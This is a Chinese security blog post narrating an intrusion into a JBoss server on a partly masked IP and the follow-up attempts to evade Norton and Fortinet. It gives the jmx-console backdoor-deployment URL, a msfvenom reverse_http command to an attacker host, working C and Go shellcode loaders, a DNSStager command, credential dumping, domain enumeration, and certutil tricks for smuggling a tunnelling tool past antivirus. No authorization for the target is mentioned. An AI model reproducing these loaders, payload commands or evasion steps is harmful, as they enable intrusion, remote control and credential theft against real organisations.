> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/iNu3-jKkeb-WEdyN6nJ7bg)

**一、外围入手**

拿到 ip 后先信息收集，扫描端口：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicPWMJfYHibxY6nv2T5wPqU6ialBenibIXHqDKFlIiacRE2yQlRqPeB9UMDEQEbF4tPSlC98QtwJ7mzibQ/640?wx_fmt=png)

8087 开放，访问：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicPWMJfYHibxY6nv2T5wPqU6OsKotFT3D3WCy6zUWibnaSGOtSczJm5LCcUwtN434iafIy2n1LA2icWag/640?wx_fmt=png)

好，用脚本试试 POST：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicPWMJfYHibxY6nv2T5wPqU6hKRUEXlH8U1j1Ctm9l3YG6rbOJb2QIz3femC5a24o1bxuv56ibISrAw/640?wx_fmt=png)

好吧，暂且不管，试试 8082：发现

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicPWMJfYHibxY6nv2T5wPqU6pt6lIptdAapYrMULHqDPgCyCdWtEuhUWN2icO1UqntAcibia6ibZoq9CmA/640?wx_fmt=png)

这个好，直接 jboss，一般可先尝试弱口令后台部署 war 包，后门文件进行压缩，改名为 “.war”：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicPWMJfYHibxY6nv2T5wPqU6eojZlibmC8WEV4nkdaPPrFU9d0m8OiaoV2H7be7ER1EcVqY7euDtxuAQ/640?wx_fmt=png)

但后台访问发现不存在：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicPWMJfYHibxY6nv2T5wPqU6BFxnyWfVQB1U4fFxfTjDEYjjDqdU1dKfngACn3Ge31QP58qO2mMkQw/640?wx_fmt=png)

那好，试试 jmx-console，好的嘛：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicPWMJfYHibxY6nv2T5wPqU6epPLvPYdvAlAyNxZFib2lO5dtJLR8CzGN3lXVuialbCHEFsBfgww7ACg/640?wx_fmt=png)

使用未授权 Deploy 漏洞：

```
访问150.*.*.*:8082/jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.admin:service=DeploymentFileRepository
```

分别在 store 后面参数处填写后门 war 文件名，文件夹名称，后门文件后缀和后门文件内容：  

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicPWMJfYHibxY6nv2T5wPqU6uou8f566MykKWIxb5qglzgd9QrWH18UfG0U47NkCBtZ3kJ9O0IVpwA/640?wx_fmt=png)

点击 invoke，访问：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicPWMJfYHibxY6nv2T5wPqU677b1GAibIUXZGg6tgryLw4pnrSJzSTJfRwhCIof16bEpw4cVtjjX7Lw/640?wx_fmt=png)

**二、初步控制**
----------

为空白说明后门文件解析成功，使用蚁剑连接：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicPWMJfYHibxY6nv2T5wPqU6zl84dV5iarfmkukWWFSYPS6DU3zhYRHRxQELGiazpxeH1o1UZylbHVIw/640?wx_fmt=png)

好的嘛，再信息收集一波，ip 配置发现存在域：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicPWMJfYHibxY6nv2T5wPqU6Yf7QNf6hpgrkPFrITvTdFTXZ8vPTtLsJJQcyxFHlLhy76xRnETMibcA/640?wx_fmt=png)

当前用户发现为 “.p” 结尾，按国外的命名习惯，一半是组长或者经理级别：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicPWMJfYHibxY6nv2T5wPqU6wLSLj7zF2nLlpzarkicA1AMOOZTzLibOVTiaYkURPHlmfaunvdoibqzJ7Q/640?wx_fmt=png)

查看进程有无杀毒，使用 tasklist 然后进行对比：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicPWMJfYHibxY6nv2T5wPqU6RWX15DBoACZnt20DgCAXK5egldxsAjxcDE1CicuqMYeiaxAp3gAM1oYg/640?wx_fmt=png)

不得了，竟然有大名鼎鼎的赛门铁克公司的诺顿和飞塔：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicPWMJfYHibxY6nv2T5wPqU67zb5Aqfo7Tsp1NUnFNB73nPnHLhDndRbMOrvWwMSGBFKSgEemSVGYw/640?wx_fmt=png)

看来这次棘手了，接下来试试各种免杀手段上线 cs。

**三：Bypass 免杀**
---------------

### **3.1 base64 加密 shellcode 加载**

参考 Tide 安全团队的免杀系列，使用 base64 生成：

```
msfvenom -p  windows/meterpreter/reverse_http --encrypt base64  lhost=1*.1*.7*.3 lport=800  -f c > shell.c
```

然后在 cs 开启监听（*.*.*.* 为你 vps 地址）：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicPWMJfYHibxY6nv2T5wPqU66Kv9ib7xLqtZQAbs8GTSQQicfiaPyGVMHSicpiaxyF4Ziaekm6KUPJia8O9yw/640?wx_fmt=png)

注意：这里 msfconsole 唯有 windows/meterpreter/reverse_http 和 windows/meterpreter/reverse_https 是对应 cs 监听器兼容的，区别在于：cs 自生成后门首次请求 stager 连接字符较短，一般为四个字符，如 “/t1ny”,msf payload 的为很长的字符，但上线不影响。

生成 base64 加密 shellcode 后，使用解密加载器：shellcode.c：

```
#include "base64.h"
unsigned char buf[] ="..你的shellcode";
int main(int argc, const char * argv[]) {
char str1[1000] = { 0 };
Base64decode(str1, buf);
char *Memory;
Memory = VirtualAlloc(NULL, sizeof(str1), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
memcpy(Memory, str1, sizeof(str1));
((void(*)())Memory)();
return 0;
}
```

base64.c 和 base64.h 可在 tide 公众号内容中找到，这里暂不列出。

最后 gcc shellcode.c base64.c -o test.exe 编译，上传：执行即可。

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicPWMJfYHibxY6nv2T5wPqU6UWA5h2zNlFkQIz3mVWHc0bFrlftBukuvgTKcbgicAKMWMGsHtumfoUQ/640?wx_fmt=png)

test.exe 明明上传了：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicPWMJfYHibxY6nv2T5wPqU6y3PwibxvcmC3lWn3xibdzqDu4K69M6Y20FqQkLSaT1938Q8aaqodEmUg/640?wx_fmt=png)

刷新查看直接没了~，没错，诺顿就是这么强。

### **3.2 go 语言加密 shellcode 执行**

好吧，吸取上次直接消失的教训，本地搭建环境进行测试，这次试试 go 语言的 shellcode 混淆;

使用 cs 生成 c 语言的 payload：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicPWMJfYHibxY6nv2T5wPqU6ib665fHENibTCesYckbicFncWw1frYgV6zJ20dP5VticibcoKempib3MVy8A/640?wx_fmt=png)

得到：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicPWMJfYHibxY6nv2T5wPqU6mnFVbC05FDEDyj6icNuLRedfYfWYKLLkVfsPPDssmd91h4cnIRVwDSw/640?wx_fmt=png)

使用替换功能，将 “\” 换为：“,0”：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicPWMJfYHibxY6nv2T5wPqU67ic52TiaEZb06j3h1V6YpJvaxSaUaiaicy8Kic5UtThY9gM7hRCBAV4kTmQ/640?wx_fmt=png)

最后替换加载器中 shellcode_buf = []byte 部分内容：

```
package main
import (
"io/ioutil"
"os"
"syscall"
"unsafe"
)


const (
MEM_COMMIT             = 0x1000
MEM_RESERVE            = 0x2000
PAGE_EXECUTE_READWRITE = 0x40
)
var (
kernel32       = syscall.MustLoadDLL("kernel32.dll")
ntdll          = syscall.MustLoadDLL("ntdll.dll")
VirtualAlloc   = kernel32.MustFindProc("VirtualAlloc")
RtlCopyMemory  = ntdll.MustFindProc("RtlCopyMemory")
shellcode_buf = []byte{0xfc,0x48,0x83,0xe4,0xf0,………}
)
func checkErr(err error) {
if err != nil {
if err.Error() != "The operation completed successfully." {
println(err.Error())
os.Exit(1)
}
}
}
func main() {
shellcode := shellcode_buf
if len(os.Args) > 1 {
shellcodeFileData, err := ioutil.ReadFile(os.Args[1])
checkErr(err)
shellcode = shellcodeFileData
}
addr, _, err := VirtualAlloc.Call(0, uintptr(len(shellcode)), MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE)
if addr == 0 {
checkErr(err)
}
_, _, err = RtlCopyMemory.Call(addr, (uintptr)(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
checkErr(err)
syscall.Syscall(addr, 0, 0, 0, 0)
}
```

最后在 linux 环境安装 go 语言环境，使用命令 “CGO_ENABLED=0 GOOS=windows GOARCH=amd64 go build shellcode.go” 编译。

最后上传，发现文件未被删除：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicPWMJfYHibxY6nv2T5wPqU6SXvresjjV779Tlxf4f6VXsLc5WZ4qMTrIBcEF9oeicxkl9AjKJbW0ibw/640?wx_fmt=png)

小心翼翼地去执行一下：

没想到文件本身过了查杀，缺被拦截了访问行为：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicPWMJfYHibxY6nv2T5wPqU65gNlshK81genVkvquiauVVjhDQQ0XSlepRco8LktU1h4omLRbmeO73A/640?wx_fmt=png)

本地允许后：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicPWMJfYHibxY6nv2T5wPqU69h6IS1GTLGq0Iwg5sibaSzKDCScKCkxUl3GiahLWYzdbTeJ7l2HdRQcw/640?wx_fmt=png)

哇，国外的 av 和国内的 av 就是不一样，拦截规则卡的是真的死死的。

### **3.3 FourEye 免杀**

再试试比较不错的 FourEye ：

地址为：https://github.com/lengjibo/FourEye

使用 cs 生成 raw 格式 payload 后放到 linux：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicPWMJfYHibxY6nv2T5wPqU6AxuwQoBLtG56j2ckKxsV6U4icdcUBz0T9VjoY3pGL1A4Y34W08np20g/640?wx_fmt=png)

根据教程：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicPWMJfYHibxY6nv2T5wPqU6L6PhciboZyIBm2GQkBLj7e6zQIo0ScEFKsFJqNH97Mwz4TvYMDWkEVg/640?wx_fmt=png)

得到 exe 上传，执行：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicPWMJfYHibxY6nv2T5wPqU6UBR2pJ9uJbD7eMlEahEfe7Y0poDzTMldaVSzK3RnRID6RJsbpdltgA/640?wx_fmt=png)

发现 cs 端有 stager 请求记录，说明已经下载了 stager，可以根据 stager 内容进行执行了。但看本地环境发现依然拦截了后续请求：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicPWMJfYHibxY6nv2T5wPqU6cykZJAKzegndhRWOENcnl29BDQia9e5dxS2R7FNol61wpnqRJ4t2TXw/640?wx_fmt=png)

说明加密执行后门本身没问题了，**只是 c2 server 端可信程度不够，还可试试申请可信域名 + c2 可信证书 + https 加密上线了。**

### 3.4 DNStager 分离免杀

参考文章《实战填坑 | CS 使用 CDN 隐藏 C2》：[https://mp.weixin.qq.com/s/B30Unfh5yAN4A151P1gsMQ](https://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&mid=2247496969&idx=1&sn=eeda795dcd95bcf19ebc8e26546a6b97&scene=21#wechat_redirect)

去申请了域名，部署了 cdn，重新尝试 go 加密 shellcode 和 FourEYe 之后依然拦截通信请求行为。

最后参考《DNSStager-DNS 分离 shellcode》：

[https://mp.weixin.qq.com/s/bM_rsh8KxXwwyEkbHRTKsw](https://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&mid=2247497134&idx=1&sn=84c583af97d758acfa8f9a3621b5a39d&scene=21#wechat_redirect) 终于成功获取了 shell。

首先安装 ming-w64，将 CDN 服务端解析的 NS 记录添加一个 test.*.tk:

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicPWMJfYHibxY6nv2T5wPqU6hP1HWYOeKY7nbFibPw6NyKhYHGrCvAVoyd6pKPACwMYJf9MtyJwqBnA/640?wx_fmt=png)

最后在 vps 处执行：

```
python3 dnsstager.py --domain test.*.tk --payload x64/c/ipv6 --output /home/a2.exe --prefix cdn- --shellcode_path /home/DNSStager/payload.bin --sleep 1 --xorkey 0x10
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicPWMJfYHibxY6nv2T5wPqU6gjoUicXKeCUGTzS7gDPCO2Q88IqAuiauJarLq0m0kH6oriadG9uGNqcjA/640?wx_fmt=png)

上传执行后终于获取：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicPWMJfYHibxY6nv2T5wPqU65cTfUeaZQ9BOhNnZnS397uNbuDqyo6OHJGn0Sic5GcXJZb0AicwTxcJw/640?wx_fmt=png)

如图：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicPWMJfYHibxY6nv2T5wPqU6O5qmfyh6KPhQRT6tF1UsvxyqUjly8l7qEKNJL4F0NfZlrI8PxPwIbg/640?wx_fmt=png)

终于可以喘口气，拿下了。

**四：简单后渗透**
-----------

### **4.1 内网信息收集**

cs 的自带功能，抓取密码：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicPWMJfYHibxY6nv2T5wPqU6CV7FibvCgSNmc85UtgzLw0kC3d5floeyANtRcs8mhqtePdEicUkz2uGg/640?wx_fmt=png)

获取到当前用户密码：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicPWMJfYHibxY6nv2T5wPqU6Cfibfl7ialw9g7ickxN6Z3ounMfF1Qz5ib7e0zfGiaFZHiantMNVQBibLetVw/640?wx_fmt=png)

查看进程列表，发现其余进程均为低权限和 system 进程，说明无其他用户在此登录。

既然有域，那就进行一下域内信息收集，发现好像有各种限制:

```
net group "domain controllers" /domain
```

查看域控制器：  

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicPWMJfYHibxY6nv2T5wPqU6jHgXWnqnR1icyuBagQGXgzCqdEKAkdFot5Q1ibvuiaR3rL0GEoiaLkvpsw/640?wx_fmt=png)

```
net group "domain admins" /domain
```

也是如此：  

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicPWMJfYHibxY6nv2T5wPqU6Z89IoBd09Xjd3tsLDtJxLE83K4UUlApvkibJHAVbeJ4yLBAibNibTZDPA/640?wx_fmt=png)

### **4.2 横向尝试**

既然本机无其余用户信息，避免动静过大，就不再尝试提权至 system 了（主要杀软太牛逼），直接上传 frp 横向信息收集丫的：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicPWMJfYHibxY6nv2T5wPqU65czUZCPSib5AZW9PB8qVDAKVM2ia0h09icBibyqniaX7ZDV6qpj8joUEQXw/640?wx_fmt=png)

我滴天？竟然上传失败？猜测是因为使用了 CDN + 诺顿检测请求太高的数据包，造成回传数据失败。那就换个思路，既然 10M 体量有问题，就拆分一半，最后再合并，同时避免后缀内容检测问题，先使用 certutil 编码一下 frpc.exe 为 txt：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicPWMJfYHibxY6nv2T5wPqU6JibqFZVddJZ0GibAYS9dfnB5pLOVCFkZ6ndoSbbRkfkLX2FVvp06GYFw/640?wx_fmt=png)

好家伙，10M 直接干到 14M，行，问题不大，中间拆分，各自一半：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicPWMJfYHibxY6nv2T5wPqU6z8rWOcQMj33FVMIOxg26qMWIaDTs7FkgswdRZl9zY9uRicu3iaqEveGQ/640?wx_fmt=png)

最后的思路是分别本地解码为 exe 后：

```
certutil -decode 1.txt 1.exe
certutil -decode 2.txt 2.exe
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicPWMJfYHibxY6nv2T5wPqU6oAqvecAjhTLBIhGcQ3HSYcH82MGqibIP0ib8TWIHWZk80QdMLz7crLaA/640?wx_fmt=png)

再进行合并：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicPWMJfYHibxY6nv2T5wPqU6eqHKKYQ72Ns616IwsPpPsNEF3QO0dEfZbfy95gn5LKExH6KeB1eOpA/640?wx_fmt=png)

最后本地进行校验，查看文件是否完整：

```
certutil –hashfile 3.exe MD5
```

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicPWMJfYHibxY6nv2T5wPqU6GsyibrXCicBWRZNQRokq7gSFxmJV0ibAoSLwJHB8rvPjz3NQy2vehFichg/640?wx_fmt=png)

是一致的没错，实战环境上传 txt：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicPWMJfYHibxY6nv2T5wPqU61TBNCca9aHJTm90ic8mucCwfg1FcjSg8n1Qeejp3I3rceGAjEYcSxog/640?wx_fmt=png)

解码：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicPWMJfYHibxY6nv2T5wPqU6oaXJnGxwCuyXmzsRDdtPI5moWTRlSOESFRialsHhvDfjy7JkFV6IJhg/640?wx_fmt=png)

合并后，执行：

![](https://mmbiz.qpic.cn/mmbiz_png/Uq8QfeuvouicPWMJfYHibxY6nv2T5wPqU6ZptWT89TVpkee1HSt00hRq2FwqAicGc2B2DUH3x6ceicnBVQX4NckibGA/640?wx_fmt=png)

我要抓狂了，竟然还是不能执行程序，太失败了。

最后整理并总结完成后发现 jboss 业务已经关闭，下一步的思路使用 regorge 代理暂时也不可行，只能暂时先放下了。

![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)

**推荐阅读：**

[**DNSStager-DNS 分离 shellcode**](http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&mid=2247497134&idx=1&sn=84c583af97d758acfa8f9a3621b5a39d&chksm=ec1ca091db6b2987eb6656df2749dae2789fc033f24b6b400e1a8f827fa743150155edb01be2&scene=21#wechat_redirect)  

**[CS 如何配置通过 CDN 上线](http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&mid=2247490277&idx=1&sn=62528cb1168e28003a59d693ec44006e&chksm=ec1f4fdadb68c6cc111edb7fa3b33c8e868c294e6eaee2127e912f24db8636be3e800e53a2d1&scene=21#wechat_redirect)  
**

本月报名可以参加抽奖送暗夜精灵 6Pro 笔记本电脑的优惠活动  

[![](https://mmbiz.qpic.cn/mmbiz_jpg/Uq8Qfeuvouibfico2qhUHkxIvX2u13s7zzLMaFdWAhC1MTl3xzjjPth3bLibSZtzN9KGsEWibPgYw55Lkm5VuKthibQ/640?wx_fmt=jpeg)](http://mp.weixin.qq.com/s?__biz=MzI5MDU1NDk2MA==&mid=2247496998&idx=1&sn=da047300e19463fc88fcd3e76fda4203&chksm=ec1ca019db6b290f06c736843c2713464a65e6b6dbeac9699abf0b0a34d5ef442de4654d8308&scene=21#wechat_redirect)

**点赞，转发，在看**

原创投稿作者：伞

![](https://mmbiz.qpic.cn/mmbiz_gif/Uq8QfeuvouibQiaEkicNSzLStibHWxDSDpKeBqxDe6QMdr7M5ld84NFX0Q5HoNEedaMZeibI6cKE55jiaLMf9APuY0pA/640?wx_fmt=gif)